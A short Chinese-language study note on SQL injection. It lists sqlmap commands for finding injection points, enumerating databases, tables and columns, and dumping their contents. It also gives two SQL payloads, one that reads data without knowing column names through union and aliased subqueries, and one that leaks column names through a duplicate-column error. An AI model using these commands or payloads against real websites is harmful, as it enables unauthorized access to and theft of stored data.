# SQL注入学习

### SQLmap用法

探测注入点：````sqlmap -u [可能出现注入点的链接地址] --forms````

获取数据库名：```` sqlmap -u [url] -dbs````

获取数据表名：````sqlmap -u [url] -D [数据库名] --tables````

获取字段名：````sqlmap -u [url] -D [数据库名] -T [数据表名] --columns````

获取数据库内内容： ````sqlmap -u [url] -D [数据库名] -T [数据表名] -C '字段1,字段2,字段3.....' --dump````

### 无法获取列名(报错注入获取列名)

利用union搭配别名子查询，在不知道字段的时候进行注入(即通过字段的顺序指定):

````sql
.... union select (select e.4 from (select * from (select 1)a,(select 2)b,(select 3)c,(select 4)d union select * from test)e limit 1 offset 3)f,(select 1)g,(select 1)h,(select 1)i;
````

通过报错注入获取列名:

````sql
.... and (select * from (select * from test as a join test as b using(已知列名1,已知列名2......)) as c);
````

原理就是在使用别名的时候，表中不能出现相同的字段名，于是我们就利用join把表扩充成两份，在最后别名c的时候 查询到重复字段，就成功报错。